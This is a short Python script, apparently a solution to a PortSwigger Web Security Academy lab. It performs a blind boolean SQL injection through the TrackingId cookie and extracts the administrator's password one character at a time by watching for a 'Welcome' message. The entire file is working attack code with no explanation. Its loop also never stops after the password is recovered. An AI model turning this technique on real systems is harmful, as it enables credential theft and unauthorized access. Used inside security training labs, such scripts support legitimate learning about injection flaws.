import requests

url = "https://0add002a0486cd9681eea26c00b300f3.web-security-academy.net/"

password = ''
vals = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
counter = 1
while(True):
	print(f"Looking for char #{counter}")
	for i in vals:
		session = requests.Session()
		tracking_cookie = f"abc' OR SUBSTRING((select Password from Users where Username='administrator'), {counter}, 1) ='{i}"
		#print(tracking_cookie)
		response = session.get(
			url,
			cookies={'TrackingId':tracking_cookie})
		if(b"Welcome" in response.content):
			password += i
			counter += 1
			break
	print(password)
